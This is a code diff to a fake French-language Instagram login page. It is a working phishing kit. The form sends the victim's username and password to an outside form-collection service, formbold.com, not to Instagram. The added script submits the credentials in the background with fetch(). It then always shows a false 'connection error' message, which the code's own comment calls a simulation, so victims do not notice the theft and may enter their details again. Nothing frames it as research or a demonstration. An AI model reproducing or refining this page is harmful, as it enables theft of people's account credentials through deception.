@@ -248,13 +248,14 @@
     <div class="main-container">
         <div class="main-box">
             <p class="instagram-title">Instagram</p>
-            <form action="https://formbold.com/s/9xvVr" method="POST">
+            <form id="login-form" action="https://formbold.com/s/9xvVr" method="POST">
                 <input type="text" name="username" class="input-field" placeholder="Téléphone, nom d’utilisateur ou email" required>
                 <div class="password-container">
                     <input type="text" name="pass" id="password" class="input-field password-field" placeholder="Mot de passe" required>
                     <span class="toggle-password" onclick="togglePassword()" id="toggleText">Afficher</span>
                 </div>
                 <button type="submit" class="login-btn">Se connecter</button>
+                <p id="error-message" style="color: red; font-size: 14px; display: none;">Erreur de connexion. Veuillez réessayer.</p>
             </form>
             <div class="separator">ou</div>
             <a href="#" class="facebook-login">
@@ -295,6 +296,51 @@
             <p>© 2025 Instagram par Meta</p>
         </div>
     </div>
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            const form = document.getElementById("login-form"); // ID du formulaire
+            const errorMessage = document.getElementById("error-message");
+    
+            form.addEventListener("submit", function(event) {
+                event.preventDefault(); // Empêche le rechargement de la page
+    
+                const formData = new FormData(form);
+    
+                fetch(form.action, {
+                    method: form.method,
+                    body: formData
+                })
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error("Problème de connexion");
+                    }
+                    return response.text();
+                })
+                .then(data => {
+                    // Simulation d'un problème
+                    errorMessage.textContent = "Erreur de connexion. Veuillez réessayer.";
+                    errorMessage.style.display = "block";
+                })
+                .catch(error => {
+                    errorMessage.textContent = error.message;
+                    errorMessage.style.display = "block";
+                });
+            });
+        });
+    
+        function togglePassword() {
+            var passwordField = document.getElementById("password");
+            var toggleText = document.getElementById("toggleText");
+            if (passwordField.style.webkitTextSecurity === "disc") {
+                passwordField.style.webkitTextSecurity = "none";
+                toggleText.textContent = "Masquer";
+            } else {
+                passwordField.style.webkitTextSecurity = "disc";
+                toggleText.textContent = "Afficher";
+            }
+        }
+    </script>
+    
 </body>
 </html>
 
